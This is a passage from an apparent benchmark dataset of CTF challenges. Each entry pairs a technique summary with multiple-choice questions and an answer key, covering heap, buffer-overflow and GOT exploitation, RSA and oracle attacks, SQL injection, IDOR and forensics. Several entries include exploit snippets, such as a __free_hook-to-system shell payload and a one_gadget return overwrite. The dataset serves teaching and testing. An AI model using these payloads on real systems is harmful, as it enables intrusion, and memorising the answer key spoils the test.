            "When attempting to solve a cryptographic challenge that involves a scenario where you're given the ability to divide the exponent of an encrypted secret by an arbitrary input, but direct inversion of operations is computationally infeasible, which approach is most suitable to simplify brute-forcing the encrypted data? - A. Directly solve for the exponent without dividing it. - B. Only divide the exponent by small constants to gradually decrease its value. - C. Exploit the server functionality to divide the exponent by a significant factor to reduce the problem to a smaller, more manageable search space. - D. Ignore the server functionality and attempt to decrypt the secret without manipulating the exponent. ",
            "In an encryption scheme where you have control over dividing the exponent of an encrypted secret and are tasked with deciphering it, what technique is suggested for efficiently cracking the secret one segment at a time? - A. Divide the exponent by the smallest possible factor indefinitely until the entire secret is revealed. - B. Attempt to decrypt the secret without manipulating the exponent, relying on computational power to brute-force the secret as a whole. - C. Use bit-shifting techniques to isolate and solve for small portions of the secret one at a time, starting from the most significant bits by dividing the exponent to effectively shift it to the right. - D. Increase the value of the exponent by multiplying it, aiming to expand the search space for easier segmentation of the secret. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "diylist",
        "write_up": "dataset/raw/diylist.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 453,
        "max_score": 755,
        "difficulty": 0.6,
        "knowledge": [
            "To exploit type confusion vulnerabilities, one can manipulate union data structures to misinterpret the type of data stored, enabling arbitrary read or write capabilities. This can be done by asking the application to interpret the data in a union as a different type than it was initially stored as. In scenarios where unions are part of the data structure, carefully crafted inputs can lead to out-of-bounds read or write, leveraging differences in data sizes and representations.",
            "For exploiting double-free vulnerabilities, predicting or controlling the memory layout allows one to strategically place objects in memory to be freed multiple times. This can lead to code execution by poisoning the tcache or fastbin list of the malloc implementation with a controlled pointer. The exploitation chain can include allocating a controlled payload at a predictable location, freeing it to introduce a vulnerability, and then manipulating the application's memory allocation to execute arbitrary code or alter program behavior. In exploitation contexts where heap manipulation is possible, one could:\n   - Add a controlled object to the heap.\n   - Free it multiple times to trigger a double-free condition.\n   - Exploit the vulnerable state to hijack control flow, such as overwriting `__free_hook` with the address of `system`, and then triggering `free` on a string containing a command like `/bin/sh` to spawn a shell.\n\nExample payload for hijacking `__free_hook` with `system` and executing `/bin/sh`:\n```\nadd($t, 3, pack(\"Q\", $libc_address_of___free_hook));\nadd($t, 3, pack(\"Q\", $libc_address_of_system));\nadd($t, 3, \"/bin/sh\\0\");\ndel($t, index_of_bin_sh_string);\n```"
        ],
        "question": [
            "In a CTF challenge focusing on exploiting type confusion vulnerabilities with a union structure involving `char *`, `long`, and `double` types, which of the following would be a valid strategy to achieve an arbitrary read vulnerability by confusing types? - A. Request the application to treat a `long` value as a `double`, ensuring that the precision of the number remains the same. - B. Insert a `long` value and then request the application to interpret this value as a `char *` pointing to an arbitrary memory location. - C. Store a `double` value and repeatedly request its size until the application returns pointer-sized information. - D. Create a `char *` pointer to a controlled buffer, then interpret it as a `double` to manipulate its floating-point representation. ",
            "In a scenario where a double-free vulnerability is present, and exploitation involves manipulating heap memory to execute arbitrary code, which of the following payloads correctly outlines the steps to hijack `__free_hook` with the address of `system` and execute `/bin/sh`? - A. Add an item with the type `double` containing the `__free_hook` address, free it, then overwrite it with the `system` address. - B. Allocate a string, free it twice to trigger a double-free, then use heap manipulation to overwrite memory at `__free_hook` with the `system` command. - C. Add three items: first with the address of `__free_hook` packed as a `long`, the second as an arbitrary number, and the third as the string `/bin/sh\\0`. Finally, free the string to trigger execution. - D. Add three items consecutively with the `char *` type: the `__free_hook`'s address, a null pointer, and the address of `system`, and afterward insert a string `/bin/sh\\0`, then trigger a delete operation on it. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "diysig",
        "write_up": "dataset/raw/diysig.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 394,
        "max_score": 755,
        "difficulty": 0.5218543046357615,
        "knowledge": [
            "In challenges involving cryptographic signature systems with an LSB (Least Significant Bit) Oracle vulnerability, one can exploit the system by using the LSB of the decryption of a manipulated ciphertext to perform a binary search for the plaintext message. This is predicated on the ability to manipulate ciphertext ('c') and query the oracle with `pow(x, e, n) * c % n`, adjusting 'x' each time to refine the search space based on the LSB of the decryption result. This method specifically applies when the Oracle reveals the parity of the decrypted message, allowing for a binary search approach to determine the original message.",
            "The process of iterative halving or binary searching in cryptographic challenges with an LSB oracle involves adjusting the factor `pow(1 << i, e, n)` in the manipulated ciphertext query to systematically guess and narrow down the possible range of the plaintext message. This technique relies on the property that if the LSB of the decrypted result is '0', the decrypted plaintext is less than or equal to half the modulus 'n', and if '1', it is greater, thereby revealing information about the plaintext bit by bit until the original message is determined. This approach is effective in cryptographic systems where the parity (odd or even nature) of the plaintext can indirectly reveal information about the plaintext itself.\n\nExample payload structure (Python code snippet):\n```python\nfor i in range(bitlength_of_n):\n    manipulated_ciphertext = pow(2**i, e, n) * c % n\n    if oracle(manipulated_ciphertext) == 0:\n        # Adjust the search space based on the oracle's response\n        # indicating that the true plaintext is less than or equal to half of n\n    else:\n        # Adjust the search space based on the oracle's response\n        # indicating that the true plaintext is greater than half of n\n```"
        ],
        "question": [
            "In a cryptographic signature system challenge, how does the presence of an LSB (Least Significant Bit) Oracle vulnerability influence the approach to decrypting a ciphertext without directly uncovering the plaintext? - A. It allows for direct deciphering of the plaintext by reversing the encryption algorithm. - B. It enables an attacker to exploit the system by using the LSB of decrypted manipulated ciphertexts to perform a binary search for the plaintext message. - C. It requires brute-forcing all possible keys until the decrypted message matches the LSB pattern. - D. It necessitates guessing the encryption key based on the LSB of a series of unrelated ciphertexts.",
            "When utilizing the LSB oracle in a cryptographic challenge to perform a binary search for the plaintext message, which Python code snippet correctly demonstrates adjusting the factor `pow(1 << i, e, n)` in the manipulated ciphertext query? - A. For i in range(256): encrypted_message = pow(i, e, n) * c % n - B. For i in range(1024): ciphertext = pow(2, e) * c - C. For i in range(bitlength_of_n): corrupted_ciphertext = pow(2**i) * c % n - D. For i in range(bitlength_of_n): manipulated_ciphertext = pow(2**i, e, n) * c % n"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Do U Have Knowledge_",
        "write_up": "dataset/raw/Do U Have Knowledge_.md",
        "type": "crypto",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": -1.0,
        "max_score": 497,
        "difficulty": -1,
        "knowledge": [
            "For challenges leveraging the Python `random` module seeded with a predictable value such as the current time, it is possible to predict future outputs of the random number generator if the seed value (e.g., server timestamp) is known or can be closely approximated. This knowledge can be utilized to bypass randomness-based security mechanisms by mirroring the sequence generation on the attacker's side.\n   - To exploit this, seed a local instance of the random number generator with the predicted seed value and generate values in the same sequence as the target application. Example: `random.seed(predicted_seed_value)` followed by `predicted_value = random.randint(1, 65535)`.",
            "When dealing with cryptographic algorithms that incorporate timestamps as a part of their randomness or state generation mechanism, precision discrepancies between the attacker\u2019s environment and the target system can be overcome through brute force. Specifically, if the exact timestamp (to the required precision) used in cryptographic operations is partially known but not to its full precision, varying the unknown part of the timestamp in a brute-force manner can lead to the discovery of the correct input parameters.\n   - This approach involves generating potential cryptographic keys or states by iterating over the range of possible timestamp values that were not directly observable. For instance, if a timestamp `ts` is known to a certain precision, and a cryptographic operation utilizes a higher precision timestamp, one could iterate over all possible values of `ts + delta`, where `delta` is the range of uncertainty in the timestamp. Example: Loop through a given range of milliseconds or microseconds appended to the known timestamp part to recreate the cryptographic operation's input parameters."
        ],
        "question": [
            "In a crypto challenge, an attacker is able to predict future outputs of a number guessing game implemented in Python using the following code snippet: ```python random.seed(int(time.time())) for _ in range(3): number = random.randint(1,65535) guess = input('Guess the next lottery number: ') guess = int(guess) if(number == guess): print('Congratulations, you won the lottery.') return True else: print('Wrong. The correct number was {}.'.format(number)) ``` Given this scenario, how can the attacker predict the number generated by the server? - A. Use the `hashlib` library to hash the current time and use it as a seed. - B. Calculate the server's timestamp delay and adjust the local clock accordingly. - C. Seed a local instance of the random number generator with the server's timestamp to predict the number. - D. Intercept the network traffic to directly obtain the number before it is displayed. ",
            "In the context of attacking a cryptographic system that relies on timestamps for generating cryptographic keys, if an attacker knows a part of the timestamp but lacks precision, what strategy can be employed to discover the correct parameters used in the operation? - A. Adjust the server's clock to match the attacker's system time for synchronization. - B. Iterate over a range of possible microsecond values added to the known timestamp to brute-force the exact time used in the cryptographic operation. - C. Use a rainbow table to reverse-engineer the timestamp from the cryptographic output. - D. Employ a machine learning algorithm to predict the missing microsecond values based on patterns observed in the encrypted output. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Do You Know GIF_",
        "write_up": "dataset/raw/Do You Know GIF_.md",
        "type": "The type of challenge is `forensics`.",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When encountering a file in a CTF challenge, using tools designed for steganography such as `steghide`, `stegoveritas`, and `stegextract` can be a crucial initial step to uncover hidden data within the file. However, if these tools yield no result, exploring the metadata of the file with tools like `exiftool` can reveal hidden comments or data embedded within.",
            "In a situation where an initial examination with `exiftool` does not reveal useful information, using additional options such as `-a` to exhaustively display all available information including hidden or duplicate comments is necessary. These comments may contain parts of a flag or clues for further steps in a CTF challenge and can be in various formats, including hexadecimal strings that may need conversion to human-readable format.\n\nExample payload for extracting all comments with exiftool:\n```bash\nexiftool -a dante.gif | grep Comment\n```"
        ],
        "question": [
            "In a Capture the Flag (CTF) challenge that involves analyzing a suspicious file, which steganography tool is not suitable for revealing hidden data within image metadata? - A. steghide - B. stegextract - C. exiftool - D. stegoveritas",
            "When using `exiftool` to analyze a GIF file for a CTF challenge and the initial examination reveals negligible information, which exiftool option allows for a deeper investigation that may uncover hidden or duplicate comments potentially holding significant clues or parts of a flag? - A. `-d` option to display information in a specific date format. - B. `-z` option to attempt to unzip compressed information within the file. - C. `-a` option to exhaustively list all metadata, including hidden or duplicate comments. - D. `-E` option to escape HTML special characters in the output."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Do you know them _",
        "write_up": "dataset/raw/Do you know them _.md",
        "type": "forensics",
        "competition": [
            "darkCON/2021",
            "https://ctftime.org/event/1250/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "To find recently accessed folders in a Windows environment, especially during forensic analysis of an E01 image, use the NTUSER.DAT file located in the user's profile directory. The key `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\Folder` contains values referenced by `MRUListEx` which indicates the order of the most recently used documents or folders. Tools like regripper and Registry Explorer can be used to parse these keys and values for data extraction, leading to the identification of the last accessed folder.",
            "For identifying the last keyword searched and the last link entered in a Windows environment, the NTUSER.DAT registry hive holds significant information. The last keyword can be extracted from the path `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery`, and for browsers like Internet Explorer, the last typed URL can be found under `SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs`. Each value under these keys, particularly the first values (like the first word in WordWheelQuery and url1 in TypedURLs), provides the necessary details. Utilizing forensic tools to analyze and extract these values is essential for gathering such information."
        ],
        "question": [
            "In a digital forensic analysis challenge focusing on identifying recently accessed folders via an E01 image of a Windows system, investigators need to examine the NTUSER.DAT file found in a user's profile directory. Which registry key should be analyzed to locate the value referring to the last accessed folder? - A. `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs` - B. `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery` - C. `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\Folder` - D. `SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs`",
            "When analyzing a Windows system's NTUSER.DAT file to identify the last keyword searched and the last link entered, specifically focusing on data related to Internet Explorer, which paths within the registry hive are critical to examine for each piece of information, respectively? - A. Last keyword: `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery`; Last link entered: `SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs` - B. Last keyword: `SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs`; Last link entered: `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery` - C. Last keyword: `SYSTEM\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery`; Last link entered: `SYSTEM\\Microsoft\\Internet Explorer\\TypedURLs` - D. Last keyword: `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\Folder`; Last link entered: `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs`"
        ],
        "answer": [
            "C.",
            "A."
        ]
    },
    {
        "name": "Do You Still Feel Lucky",
        "write_up": "dataset/raw/Do You Still Feel Lucky.md",
        "type": "pwn",
        "competition": [
            "TBTL/2023",
            "https://ctftime.org/event/2002/tasks/"
        ],
        "score": 944,
        "max_score": 1000,
        "difficulty": 0.944,
        "knowledge": [
            "In a challenge involving guessing a flag with partial correctness feedback, an exploitation strategy can be crafted by taking advantage of how memory allocation and deallocation work in conjunction with input handling functions like `fgets`. Specifically, if `malloc` for the guess buffer reuses the heap space previously occupied by the flag buffer, which still contains the flag due to the way `fgets` works with heap memory, attackers can incrementally guess the flag one character at a time by leveraging the feedback system. This approach requires understanding of the underlying memory management mechanisms.",
            "To exploit a scenario where the program provides feedback based on the number of correctly guessed characters in a flag, and where an input's length affects the comparison logic, one can send prefixes of the correct guess to receive feedback that guides the next guess. This is particularly useful when the program logic compares an input against the flag character by character, up to the length of user-provided input, allowing for an incremental search strategy to find the entire flag string successfully. This exploitation technique requires crafting inputs that exploit the comparison logic's handling of string lengths and termination characters. \n\nSample of payload to test and guess the flag one character at a time:\n```python\nimport string\n\ndef guess(k, s):  \n   # Assuming p is a connection to the challenge server\n   p.sendlineafter(b':\\n', str(k).encode())  \n   p.sendlineafter(b':\\n', s.encode())  \n   ret = p.recvline()  \n   return ret.strip().decode('ascii')  \n  \nflag_prefix = 'TBTL'  # A known correct prefix of the flag\nfor i in range(60):  # Assuming the flag length could be up to 60 characters\n   for x in string.printable:  \n       result = guess(64, flag_prefix+x)  \n       if result == 'Got it!':  \n           print(flag_prefix+x)  \n           break  \n       elif result.startswith('A'):  # Feedback indicating almost correct guess\n           flag_prefix += x  \n           break\n```"
        ],
        "question": [
            "In a CTF challenge where the flag is read from a file and stored in heap memory, which C library function can cause previously freed heap memory to be reused, potentially revealing the flag if the subsequent `malloc` call allocates the same memory space? - A. `strcpy()` - B. `printf()` - C. `fgets()` - D. `strcat()`",
            "When attempting to exploit a flag-guessing program that provides incremental feedback (e.g., \"Almost!\"), which approach best utilizes this feedback to systematically uncover the entire flag using a crafted payload? - A. Sending a long string of random characters to overflow the input buffer. - B. Guessing one character at a time by appending a new character to a known correct prefix based on the feedback. - C. Using a binary search algorithm to guess the flag in halves. - D. Encrypting the guess to bypass any input validation."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Dodge",
        "write_up": "dataset/raw/Dodge.md",
        "type": "misc",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 906,
        "max_score": 906,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges that involve predicting the behavior of moving objects (such as bullets in a dodge game), objects' future positions can often be deterministically calculated if their velocity and direction are known. This is particularly useful in games or simulations where objects follow simple, predictable physics rules. A strategy to track and forecast the movement of such objects can be implemented as follows:\n   - Establish the initial position of the object.\n   - Observe the object's movement over two intervals to determine its velocity and direction.\n   - Use the observed velocity and direction to predict future positions, adjusting for any environmental factors like collisions which may alter its trajectory.",
            "When tackling tasks that require sustained interaction or evasion based on an environment's state (like avoiding bullets for many rounds in a game), implementing a heuristic algorithm that anticipates future states based on current and past information can be highly effective. This approach can circumvent the need for direct control over every aspect of the challenge and instead focus on maintaining a condition (such as survival in a dodge game) through predictive adjustments. Specifically for challenges involving collision detection and avoidance:\n   - After determining the motion pattern of obstacles (bullets), plan movements (of the player) to avoid future collisions. This involves calculating safe zones or paths by considering the trajectory of moving obstacles and adjusting the player's position accordingly.\n   - Continuously update these calculations as additional obstacles appear or as existing obstacles' trajectories change due to game mechanics like bouncing off walls."
        ],
        "question": [
            "In a game where bullets are spawned every few rounds and can move diagonally with a constant magnitude of speed, which of the following steps correctly describes how to predict the future position of a new bullet based on its initial positions in consecutive rounds? - A. Estimate the bullet's future position after only observing its position in one round since its speed and direction cannot change. - B. Calculate the bullet's velocity using its position in the first round it appears and predict its next position without verifying its trajectory. - C. Observe the bullet's position for two rounds to determine its velocity and direction, then use this data to predict its future positions, verifying the accuracy in the subsequent round. - D. Wait for the bullet to bounce off a wall to calculate its velocity and direction since initial positions do not provide enough data for prediction. ",
            "When designing a heuristic algorithm to avoid obstacles that follow predictable paths in a game, which approach is most effective in ensuring survival over numerous rounds? - A. Randomize the player's movements each round without attempting to predict the path of incoming obstacles. - B. Focus solely on avoiding obstacles in the current round without planning for future rounds. - C. Continuously calculate safe zones or paths by anticipating the future positions of obstacles based on their trajectories and adjust the player's position accordingly. - D. Only move the player in response to an obstacle's immediate threat, ignoring their predictable patterns and future positions. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "DogeStore",
        "write_up": "dataset/raw/DogeStore.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 267,
        "max_score": 500,
        "difficulty": 0.534,
        "knowledge": [
            "When dealing with a constant nonce in AES-256 CTR mode encryption, a vulnerability arises because the XOR pad generated remains constant for different encryptions. This can be exploited by creating hash collisions through carefully crafted byte manipulations, particularly in scenarios utilizing run-length encoding. This vulnerability stems from the fact that in CTR mode, the ciphertext is XOR-ed with a constant pad, making every bit-flip in the ciphertext directly influence the decrypted plaintext at the same offset. This can lead to potential information disclosure or manipulation of encrypted data if the nonce and counter are reused, undermining the encryption's integrity.",
            "A specific method to exploit the reused nonce in AES-256 CTR encrypted data, leveraging run-length encoding and SHA3 hashing for hash collisions, involves sending modified ciphertexts to the server and comparing the resulting hash values to infer information about the XOR pad used for encryption. By incrementing or decrementing counts of characters in the run-length encoding process and observing when hash collisions occur, attackers can recover XOR differences between adjacent encrypted bytes. This requires generating payloads that adjust the least significant bit of count bytes in adjacent run-length encoded units and analyzing how changes affect the SHA3 hash output. Example payloads for manipulating the counts would look like this in pseudocode: `xor_payload(offset, l1, c1, l2, c2)`, where `l1`, `c1` are the letter and count at one position, and `l2`, `c2` are the manipulated values at an adjacent position, aiming to toggle the least significant bit to induce a hash collision."
        ],
        "question": [
            "In the context of exploiting a constant nonce in AES-256 CTR mode encryption, which of the following accurately describes why a constant XOR pad can be a vulnerability? - A. The constant XOR pad allows for the encryption key to be easily discovered by observing the length of the ciphertext. - B. With a constant XOR pad, the encryption method effectively becomes a simple substitution cipher, which can be broken with frequency analysis. - C. A constant XOR pad enables attackers to directly manipulate the plaintext by flipping bits in the ciphertext, as the XOR operation's outcome directly maps to changes in the plaintext. - D. The reuse of the XOR pad leads to the encryption method being vulnerable to collision attacks on the hashing algorithm, thereby revealing the plaintext without needing the key.",
            "When exploiting the vulnerability of a reused nonce in AES-256 CTR mode encryption via run-length encoding and observing SHA3 hash collisions, what critical step allows attackers to infer changes in the decrypted plaintext? - A. Submitting payloads that systematically vary the encryption key and observing the corresponding changes in the size of the encryption output. - B. Adjusting the least significant bit of run-length encoded character counts in submitted payloads and comparing resulting hash outputs to identify collision patterns. - C. Encrypting large amounts of random data and analyzing the output for predictable patterns that suggest a weakened encryption algorithm. - D. Comparing the encryption speed of modified payloads to determine the efficiency of the hashing algorithm and thus indirectly deduce changes in the plaintext."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "door lock",
        "write_up": "dataset/raw/door lock.md",
        "type": "web",
        "competition": [
            "CyberGrabs/2021",
            "https://ctftime.org/event/1353/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "For SQL Injection challenges where the initial payload attempts do not yield the desired outcomes, it's advisable to observe other potential vectors such as URL parameters that may be susceptible to different types of vulnerabilities. In this scenario, switching focus from a direct SQL injection in the login form to exploiting an Insecure Direct Object Reference (IDOR) vulnerability via manipulation of URL parameters can lead to success. Example payload for initial SQLi attempt: `admin' or '1'='1`",
            "In situations where an IDOR vulnerability is suspected, especially when specific parameters like `?id=` are present in the URL, tools like Burp Suite can be highly effective in automating the process of brute-forcing these parameter values to uncover hidden or unauthorized resources. This method involves systematically testing a range of values for the parameter until an unexpected access is granted or sensitive information is revealed."
        ],
        "question": [
            "While attempting to exploit SQL Injection vulnerabilities, if the initial payloads do not provide the expected results, what should be the next step according to the given scenario? - A. Retry the same payloads with different SQL functions - B. Focus on URL parameters that might be vulnerable to other types of attacks such as IDOR - C. Increase the complexity of SQL payloads by adding more quotation marks - D. Give up and report the vulnerability as not exploitable",
            "When exploring an IDOR vulnerability, particularly with a parameter like `?id=`, which tool is recommended for automating the brute-force attack to discover unauthorized access or sensitive information? - A. Nmap - B. Wireshark - C. Metasploit - D. Burp Suite"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "DoRSA",
        "write_up": "dataset/raw/DoRSA.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 450,
        "max_score": 477,
        "difficulty": 0.9433962264150944,
        "knowledge": [
            "For challenges involving RSA encryption where multiple related RSA modular products (n) are given, exploring the relationship between these products using continued fractions can lead to identifying small fractional approximations. These approximations can help in revealing factors such as \\(k/x\\) where \\(k\\) and \\(x\\) are integral parts of the RSA setup, and their relation to \\(e\\) and \\(\\phi\\) is crucial. This approach is particularly effective when the difference between the numerator and denominator in \\(n_2/n_1\\) is significantly small, allowing the deduction of possible values of \\(k\\) and \\(x\\), facilitating the decryption process without directly factoring \\(n\\).",
            "When you have an estimated range or approximation of \\(\\phi\\) (Euler's totient function) in RSA, it's feasible to decrypt the ciphertext without completely factoring the modulus \\(n\\). This method involves using the bounds of \\(\\phi\\) to determine its value through congruences and continued fraction approximations. Once \\(\\phi\\) is estimated, one can compute the private exponent \\(d\\) from \\(e\\) and \\(\\phi\\), which is crucial for decryption. This approach proves useful in scenarios where direct factorization is infeasible, but enough information is available to approximate \\(\\phi\\).\n\nSample of Python code used for the decryption process once a relationship between the RSA parameters is established:\n```python\nfrom Crypto.Util.number import inverse, long_to_bytes\nfrom tqdm import tqdm\nfrom sage.all import continued_fraction, GCD, crt\n\n# Given values\ne = 93546309251892226642049894791252717018125687269405277037147228107955818581561  \nn_1 = 36029694445217181240393229507657783589129565545215936055029374536597763899498239088343814109348783168014524786101104703066635008905663623795923908443470553241615761261684865762093341375627893251064284854550683090289244326428531870185742069661263695374185944997371146406463061296320874619629222702687248540071  \nenc_1 = 4813040476692112428960203236505134262932847510883271236506625270058300562795805807782456070685691385308836073520689109428865518252680199235110968732898751775587988437458034082901889466177544997152415874520654011643506344411457385571604433702808353149867689652828145581610443408094349456455069225005453663702  \n\n# Use continued fractions to find k/x\nc = continued_fraction(Integer(n_2) / Integer(n_1))\nfor i in tqdm(range(1, 150)):  \n   k = c.numerator(i)  \n   x = c.denominator(i)  \n   if GCD(e, k) != 1:  \n       continue  \n   res = inverse(e - k, e)  \n   md = e * x // GCD(e, x)\n   st = crt(res, 0, e, x) + (n_1 // md) * md - 100 * md  \n   for j in range(200):  \n       if GCD(e, st) != 1:  \n           st += md  \n           continue  \n       d_1 = inverse(e, st)  \n       flag = long_to_bytes(pow(enc_1, d_1, n_1))  \n       if b\"CCTF\" in flag:  \n           print(flag)  \n       st += md  \n```\nThis approach illustrates how cryptanalytic methods can be applied to RSA variants, leveraging mathematical properties and computational techniques to achieve decryption under specific constraints."
        ],
        "question": [
            "In a scenario where two RSA modulus \\(n_1\\) and \\(n_2\\) are derived from related prime products and the ratio \\(n_2/n_1\\) closely approximates \\(k/x\\), which technique is most suitable for determining potential small values for \\(k\\) and \\(x\\) that might aid in decrypting RSA encrypted messages without directly factoring \\(n\\)? - A. Direct brute-force attacks on the RSA modulus - B. Using continued fractions to approximate the ratio \\(\\frac{n_2}{n_1}\\) to find potential small values for \\(k\\) and \\(x\\) - C. Employing symmetric key cryptographic techniques for approximation - D. Utilizing quantum computing algorithms to directly factor \\(n\\)",
            "When given an RSA encryption scenario where the exact value of \\(\\phi\\) (Euler's totient function) is not known, but an approximation is possible through the known bounds, which step is crucial for decrypting the ciphertext without the entire factorization of the modulus \\(n\\)? - A. Using the Chinese Remainder Theorem (CRT) to directly calculate the plaintext from the ciphertext - B. Obtaining the public exponent \\(e\\) from the digital certificate - C. Estimating \\(\\phi\\) through congruences and using it to compute the private exponent \\(d\\) from \\(e\\) and \\(\\phi\\) - D. Relying solely on the encryption exponent \\(e\\) to decrypt the ciphertext"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "dorsia1",
        "write_up": "dataset/raw/dorsia1.md",
        "type": "pwn",
        "competition": [
            "WPICTF/2020",
            "https://ctftime.org/event/913/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "In buffer overflow challenges where stack alignment is manipulated or atypical, it is crucial to carefully calculate the precise amount of padding needed to overwrite the return address. This calculation should take into account the size of the local buffer, any saved base pointer (if applicable), and the specific alignment or offset introduced by the challenge. The hint provided ('A' * 77) is instrumental in determining the correct padding length to reach the return address. For example, with a local buffer of 69 bytes and assuming an 8-byte base pointer (for a 64-bit architecture), padding would be calculated as the sum of these values plus any alignment adjustments mentioned in the challenge.",
            "When the source code of a challenge leaks an address within the libc library (as seen with `printf(\"%p\\n\",system+765772);`), it can be exploited to calculate the base address of libc, and from there, offsets for specific functions or \"one_gadget\" RCE (Remote Code Execution) addresses can be applied to achieve arbitrary code execution. This requires understanding the leaked address, knowing the offset to a known function like `system()`, and leveraging tools like `one_gadget` to find gadgets within the libc version provided or hinted at by the challenge. This strategy is particularly effective when other protections, such as ASLR (Address Space Layout Randomization), are mitigated by the leak.\n    - Example of calculating offsets and sending payload to achieve code execution:\n        ```python\n        leak = int(p.recvline(), 16)  # Address leaked from the challenge\n        system = leak - 765772  # Calculate the actual system() address\n        libc_base = system - e.sym['__libc_system']  # Determine libc base\n        one_gadget = libc_base + 0x4f322  # Offset for one_gadget\n        padding = b'A' * 77  # Padding calculated based on buffer size and alignment hints\n        payload = padding + p64(one_gadget)  # Crafting the payload\n        p.sendline(payload)  # Sending the payload\n        ```"
        ],
        "question": [
            "When attempting a buffer overflow exploit in a scenario where the program disables stack alignment, and the buffer size is 69 bytes with an 8-byte base pointer, what is the minimum amount of padding needed to overwrite the return address correctly? - A. 69 bytes - B. 77 bytes - C. 88 bytes - D. 96 bytes",
            "Given a leaked address from the `printf` function showing the address of `system+765772`, how should one calculate the base address of libc to then exploit a buffer overflow vulnerability? - A. Subtract the leaked address from the program's `main` function address. - B. Add 765772 to the leaked address to find the `__libc_start_main` address. - C. Subtract 765772 from the leaked address to find the actual `system` address, and then use this to calculate the libc base. - D. Multiply the leaked address by the offset to the `one_gadget`."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "dorsia4",
        "write_up": "dataset/raw/dorsia4.md",
        "type": "pwn",
        "competition": [
            "WPICTF/2020",
            "https://ctftime.org/event/913/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a binary with partial RELRO, it is possible to overwrite the Global Offset Table (GOT) by providing a negative number as an index if the application logic allows it. This technique can be utilized to redirect execution flow to arbitrary code, such as a One-gadget RCE (Remote Code Execution) if conditions like needing to maintain the program's input functionality (e.g., scanf) prevent direct exploitation.",
            "In situations where direct writing to an address (e.g., GOT entry for a function like printf) is necessary and possible, but segment protection causes segmentation faults when attempting large writes or certain byte values, a brute-force approach of writing byte by byte can be employed. This method involves iteratively sending different bytes to the target address, monitoring for crashes or successful executions, and adjusting the payload accordingly to construct the desired address in memory without causing a segmentation fault. This can be particularly effective when setting up the environment for a One-gadget RCE, where the exact bytes of the gadget's address must be written into the GOT to hijack the execution flow.\n\nSample of payload for writing byte by byte without causing segmentation fault:\n\n```  \ns.sendline(\"-103 \" + \"91\")  # Setting up a specific byte value at a chosen offset\ns.sendline(\"-102 \" + \"b0\")  # Continues writing bytes to construct an address\ns.sendline(\"-103 \" + \"38\")  \ns.sendline(\"-104 \" + \"22\")  # Final byte to complete the address setup for One-gadget RCE\n```"
        ],
        "question": [
            "In the context of exploiting a binary with partial RELRO, why is it significant that a negative number can be used as an index for array manipulation? - A. It allows the attacker to execute arbitrary JavaScript code within the victim's browser. - B. It enables the attacker to bypass network firewalls and directly access the host's memory. - C. It permits modification of the Global Offset Table (GOT), potentially redirecting code execution to arbitrary locations such as a One-gadget RCE. - D. It prevents the application from correctly authenticating users, leading to unauthorized access.",
            "When directly modifying an address in memory to achieve exploitation, such as changing a GOT entry for executing a One-gadget RCE, why might a brute-force byte-by-byte approach be used instead of writing the entire address at once? - A. To avoid triggering syntax errors in the exploit code due to incorrect variable typing. - B. To ensure the cryptographic integrity of the modified address remains intact, preventing detection by intrusion detection systems. - C. To bypass segment protections that cause segmentation faults for certain byte values or large writes, allowing precise control over the memory address being written. - D. To enhance the performance of the exploit by reducing the computational load on the attacker's machine."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Double Message",
        "write_up": "dataset/raw/Double Message.md",
        "type": "crypto",
        "competition": [
            "Defenit/2020",
